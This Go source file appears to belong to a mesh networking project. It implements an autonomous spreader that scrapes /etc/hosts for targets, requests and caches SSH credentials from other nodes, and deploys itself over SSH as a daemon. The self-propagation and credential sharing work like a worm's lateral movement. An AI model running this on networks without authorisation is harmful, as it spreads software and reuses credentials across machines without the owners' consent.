package main

import (
	"context"
	"log/slog"
	"math"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/cortex-mesh/cortex-mesh/api"
	"github.com/cortex-mesh/cortex-mesh/transport"
	"github.com/cortex-mesh/cortex-mesh/vault"
	"golang.org/x/crypto/ssh"
)

// --- Target state machine ---

// targetStatus classifies a target's current state.
type targetStatus int

const (
	targetUnknown      targetStatus = iota // Never attempted
	targetConnected                        // Successfully joined
	targetDeployed                         // Deployed via SSH, pending join
	targetUnreachable                      // TCP timeout or refused
	targetForeignTLS                       // Port 4443 has a non-mesh TLS service
	targetNoCredential                     // No SSH credentials available
	targetDeployFailed                     // SSH deploy failed
)

// targetState tracks per-target exponential backoff and failure classification.
type targetState struct {
	status      targetStatus
	failures    int       // consecutive failure count
	lastAttempt time.Time // when we last tried
}

const (
	spreaderBaseDelay   = 30 * time.Second // initial backoff
	spreaderMaxDelay    = 30 * time.Minute // ceiling
	spreaderDialTimeout = 5 * time.Second  // TCP dial timeout
	spreaderMaxFailures = 5                // threshold for long-backoff warning
)

// nextBackoff computes the delay for this target:
//
//	min(baseDelay × 2^failures, maxDelay) ± 20% jitter
func (ts *targetState) nextBackoff() time.Duration {
	delay := float64(spreaderBaseDelay) * math.Pow(2, float64(ts.failures))
	if delay > float64(spreaderMaxDelay) {
		delay = float64(spreaderMaxDelay)
	}
	// ±20% jitter
	jitter := 1.0 + (rand.Float64()-0.5)*0.4
	return time.Duration(delay * jitter)
}

// shouldAttempt returns true if enough time has passed since the last attempt.
func (ts *targetState) shouldAttempt() bool {
	if ts.lastAttempt.IsZero() {
		return true
	}
	return time.Since(ts.lastAttempt) >= ts.nextBackoff()
}

// recordSuccess resets the failure counter on successful connection.
func (ts *targetState) recordSuccess(status targetStatus) {
	ts.status = status
	ts.failures = 0
	ts.lastAttempt = time.Now()
}

// recordFailure increments the failure counter and updates status.
func (ts *targetState) recordFailure(status targetStatus) {
	ts.status = status
	ts.failures++
	ts.lastAttempt = time.Now()
}

// --- Address filtering ---

// isRoutableAddress returns false for loopback, link-local, multicast,
// and other non-routable addresses that should not be dialed.
func isRoutableAddress(addr string) bool {
	// Strip port if present.
	host := addr
	if h, _, err := net.SplitHostPort(addr); err == nil {
		host = h
	}

	// Filter known non-routable hostnames.
	switch host {
	case "localhost", "ip6-localhost", "ip6-loopback":
		return false
	}

	ip := net.ParseIP(host)
	if ip == nil {
		// Hostname (not IP) — assume routable.
		return true
	}

	// Filter non-routable IP ranges.
	if ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
		ip.IsMulticast() || ip.IsUnspecified() {
		return false
	}

	return true
}

// isMembraneTLSError returns true if the error indicates that port 4443
// has a service that completed TCP but failed our mTLS handshake —
// meaning it's a foreign service, not our mesh.
func isMembraneTLSError(err error) bool {
	if err == nil {
		return false
	}
	msg := err.Error()
	return strings.Contains(msg, "membrane:") ||
		strings.Contains(msg, "tls:") ||
		strings.Contains(msg, "certificate")
}

// startSpreader initiates the autonomous spreading loop.
// It continuously attempts to discover and connect to peers, requesting
// credentials for unreachable hosts and deploying the mesh across the network.
//
// Safety features:
//   - Exponential backoff per target (30s base, 30m ceiling, ±20% jitter)
//   - mTLS failure classification: foreign TLS services are never SSH-deployed
//   - Non-routable addresses filtered from /etc/hosts
//   - Proxy-aware dialing via resolver hints
func startSpreader(ctx context.Context, node *api.Node, seeds []string, v *vault.Vault) {
	go func() {
		localHosts := scrapeEtcHosts()
		allTargets := append(seeds, localHosts...)

		// Deduplicate targets.
		seen := make(map[string]struct{})
		var unique []string
		for _, t := range allTargets {
			if _, dup := seen[t]; dup {
				continue
			}
			seen[t] = struct{}{}
			unique = append(unique, t)
		}

		var mu sync.Mutex
		states := make(map[string]*targetState)

		getState := func(target string) *targetState {
			mu.Lock()
			defer mu.Unlock()
			s, ok := states[target]
			if !ok {
				s = &targetState{}
				states[target] = s
			}
			return s
		}

		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				for _, target := range unique {
					if !isRoutableAddress(target) {
						continue
					}

					ts := getState(target)

					// Skip already connected targets.
					if ts.status == targetConnected {
						continue
					}

					// Skip foreign TLS services permanently.
					if ts.status == targetForeignTLS {
						continue
					}

					// Check backoff timing.
					if !ts.shouldAttempt() {
						continue
					}

					if ts.failures >= spreaderMaxFailures && ts.failures%spreaderMaxFailures == 0 {
						slog.Warn("spreader: target persistently unreachable",
							"target", target,
							"failures", ts.failures,
							"status", ts.status,
							"next_retry", ts.nextBackoff(),
						)
					}

					// --- Phase 1: Try direct TCP on port 4443 ---
					slog.Debug("spreader: attempting to join peer", "target", target)

					dialCtx, dialCancel := context.WithTimeout(ctx, spreaderDialTimeout)
					var d net.Dialer
					conn, err := d.DialContext(dialCtx, "tcp", net.JoinHostPort(target, "4443"))
					dialCancel()

					if err == nil {
						// TCP connected — attempt mTLS handshake.
						if joinErr := node.AddPeer(ctx, conn, false); joinErr == nil {
							slog.Info("spreader: joined mesh via TCP/mTLS", "target", target)
							ts.recordSuccess(targetConnected)
							continue
						} else if isMembraneTLSError(joinErr) {
							// Foreign TLS service — do NOT deploy over it.
							slog.Warn("spreader: foreign TLS on port 4443 — skipping permanently",
								"target", target,
								"error", joinErr,
							)
							_ = conn.Close()
							ts.recordFailure(targetForeignTLS)
							continue
						} else {
							// mTLS failed for other reason (e.g., cert expired).
							_ = conn.Close()
							slog.Debug("spreader: mTLS join failed", "target", target, "error", joinErr)
							ts.recordFailure(targetUnreachable)
							continue
						}
					}

					// --- Phase 2: Deploy via SSH ---
					slog.Info("spreader: node missing, attempting deployment", "target", target)

					var sshCred *vault.Credential

					if v != nil {
						// Check local vault first.
						val, ok := v.Match(target)
						if ok {
							sshCred = &val
						}
					}

					// If we don't have it locally, request from the mesh.
					if sshCred == nil {
						slog.Info("spreader: requesting credentials from mesh", "target", target)
						reqCtx, reqCancel := context.WithTimeout(ctx, 15*time.Second)
						remoteCred, reqErr := node.RequestCredential(reqCtx, target)
						reqCancel()
						if reqErr == nil && remoteCred != nil {
							sshCred = remoteCred
							// Store the acquired credential locally for future use.
							if v != nil {
								v.Store(target, *sshCred)
							}
						} else {
							slog.Debug("spreader: no credentials available for target", "target", target, "error", reqErr)
							ts.recordFailure(targetNoCredential)
							continue
						}
					}

					// We have credentials, deploy.
					deployCtx, deployCancel := context.WithTimeout(ctx, 30*time.Second)

					var signer ssh.Signer
					if len(sshCred.PrivateKey) > 0 {
						var parseErr error
						signer, parseErr = ssh.ParsePrivateKey(sshCred.PrivateKey)
						if parseErr != nil {
							slog.Warn("spreader: failed to parse private key", "target", target, "error", parseErr)
							deployCancel()
							ts.recordFailure(targetDeployFailed)
							continue
						}
					}

					deployCred := transport.DeployCredential{
						SSHUser:    sshCred.Username,
						SSHKeyData: signer,
						SSHPass:    sshCred.Password,
					}

					deployer := &transport.SelfDeployer{
						ExecArgs: []string{"-daemon"},
					}

					slog.Info("spreader: executing autonomous deployment", "target", target)
					targetWithPort := net.JoinHostPort(target, "22")
					deployStream, deployErr := deployer.Deploy(deployCtx, targetWithPort, deployCred, nil)
					deployCancel()

					if deployErr != nil {
						slog.Warn("spreader: deployment failed", "target", target, "error", deployErr)
						ts.recordFailure(targetDeployFailed)
						continue
					}

					// Deployment successful (process launched and detached).
					_ = deployStream.Close()

					time.Sleep(2 * time.Second) // Give the daemon a moment to boot.

					joinDialCtx, joinDialCancel := context.WithTimeout(ctx, spreaderDialTimeout)
					joinConn, tcpErr := d.DialContext(joinDialCtx, "tcp", net.JoinHostPort(target, "4443"))
					joinDialCancel()
					if tcpErr == nil {
						joinErr := node.AddPeer(ctx, joinConn, false)
						if joinErr != nil {
							slog.Warn("spreader: failed to join newly deployed node", "target", target, "error", joinErr)
							_ = joinConn.Close()
							ts.recordFailure(targetDeployed) // deployed but can't join yet
						} else {
							slog.Info("spreader: autonomous deployment and mesh join successful", "target", target)
							ts.recordSuccess(targetConnected)
						}
					} else {
						slog.Warn("spreader: failed to dial newly deployed node", "target", target, "error", tcpErr)
						ts.recordFailure(targetDeployed) // deployed but not joinable yet
					}
				}
			}
		}
	}()
}

// scrapeEtcHosts reads /etc/hosts and extracts non-loopback IPs/hostnames.
func scrapeEtcHosts() []string {
	data, err := os.ReadFile("/etc/hosts")
	if err != nil {
		return nil
	}

	var hosts []string
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.SplitN(line, "#", 2)[0]
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			ip := fields[0]
			if !isRoutableAddress(ip) {
				continue
			}
			hosts = append(hosts, fields[1])
		}
	}
	return hosts
}
